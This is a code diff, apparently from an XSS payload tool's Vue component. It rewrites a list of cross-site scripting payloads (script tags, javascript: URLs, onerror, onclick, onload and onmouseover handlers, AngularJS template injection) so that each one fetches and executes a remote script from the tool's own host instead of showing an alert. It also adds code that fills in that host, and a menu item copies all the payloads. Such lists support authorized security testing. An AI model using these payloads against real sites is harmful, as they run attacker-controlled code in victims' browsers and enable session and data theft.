@@ -18,78 +18,77 @@ const categories = [
   'Advanced'
 ];
 
-const payloads = ref([
+var payloads = ref([
   {
     id: 1,
     category: 'Basic',
     name: 'Basic Script Tag',
-    payload: '<script>alert("XSS")<\/script>',
+    payload: '<script>import(\'//{{DOMAIN}}\')<\/script>',
     description: 'Simple script tag execution'
   },
   {
     id: 2,
     category: 'Basic',
     name: 'Script Tag with Source',
-    payload: '<script src="https://example.com/malicious.js"><\/script>',
+    payload: '<script src="//{{DOMAIN}}/"><\/script>',
     description: 'Loads external JavaScript file'
   },
   {
     id: 3,
     category: 'Alert',
     name: 'JavaScript Protocol',
-    payload: 'javascript:alert("XSS")',
+    payload: 'javascript:import(\'//{{DOMAIN}}\')',
     description: 'JavaScript protocol in URL context'
   },
   {
     id: 4,
     category: 'Image',
     name: 'IMG Tag with JavaScript',
-    payload: '<img src="x" onerror="alert(\'XSS\')">',
+    payload: '<img src="x" onerror="import(\'//{{DOMAIN}}\')">',
     description: 'Executes when image fails to load'
   },
   {
     id: 5,
     category: 'DOM',
     name: 'innerHTML XSS',
-    payload: '<div id="test" onclick="alert(\'XSS\')">Click me</div>',
+    payload: '<div id="test" onclick="import(\'//{{DOMAIN}}\')">Click me</div>',
     description: 'Executes when element is clicked'
   },
   {
     id: 7,
     category: 'Event Handlers',
     name: 'onload Event',
-    payload: '<body onload="alert(\'XSS\')">',
+    payload: '<body onload="import(\'//{{DOMAIN}}\')">',
     description: 'Executes when body loads'
   },
   {
     id: 8,
     category: 'Event Handlers',
     name: 'onmouseover Event',
-    payload: '<div onmouseover="alert(\'XSS\')">Hover over me</div>',
+    payload: '<div onmouseover="import(\'//{{DOMAIN}}\')">Hover over me</div>',
     description: 'Executes when mouse hovers'
   },
   {
     id: 10,
     category: 'Advanced',
     name: 'AngularJS Template Injection',
-    payload: '{{constructor.constructor(\'alert(1)\')()}}',
+    payload: '{{constructor.constructor(\'import(\\\'//{{DOMAIN}}\\\')\')()}}',
     description: 'Exploits AngularJS template'
   },
   {
     id: 11,
     category: 'DOM',
     name: 'DOM-based XSS with eval',
-    payload: 'eval(alert(\'XSS\'))',
+    payload: 'import(\'//{{DOMAIN}}\')',
     description: 'Uses eval function'
-  },
-  {
-    id: 14,
-    category: 'Advanced',
-    name: 'Polyglot XSS',
-    payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/<\/scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
-    description: 'Works in multiple contexts'
   }
 ]);
+
+// replace {{DOMAIN}} with the actual domain
+payloads.value = payloads.value.map(p => ({
+  ...p,
+  payload: p.payload.replace(/{{DOMAIN}}/g, window.location.hostname + ":" + window.location.port)
+}));
 
 const items = ref([
   { label: 'Copy All Payloads', icon: 'pi pi-fw pi-copy', command: () => copyAllPayloads() },
